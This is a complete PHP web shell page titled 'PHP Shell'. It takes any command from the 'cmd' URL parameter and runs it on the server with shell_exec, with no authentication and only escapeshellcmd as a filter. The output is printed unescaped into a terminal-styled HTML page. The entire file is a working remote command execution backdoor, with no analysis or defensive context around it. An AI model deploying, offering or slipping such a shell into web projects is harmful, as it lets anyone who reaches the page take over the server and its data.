<?php
// If a command is passed via the URL, execute it
if (isset($_GET['cmd'])) {
    $cmd = escapeshellcmd($_GET['cmd']);
    $output = shell_exec($cmd);
} else {
    $output = 'Enter a command to execute:';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Shell</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Consolas, monospace;
            font-size: 16px;
            margin: 0;
            padding: 20px;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            white-space: pre-wrap; /* To preserve newlines in output */
        }
        .prompt {
            color: #00FF00;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="prompt">shell$</div>
        <form method="GET" style="display: inline;">
            <input type="text" name="cmd" style="background-color: black; color: white; border: none; width: 80%;"/>
            <input type="submit" value="Run" style="background-color: green; color: white; border: none; padding: 5px 10px; cursor: pointer;" />
        </form>
        <div>
            <?php echo $output; ?>
        </div>
    </div>
</body>
</html>
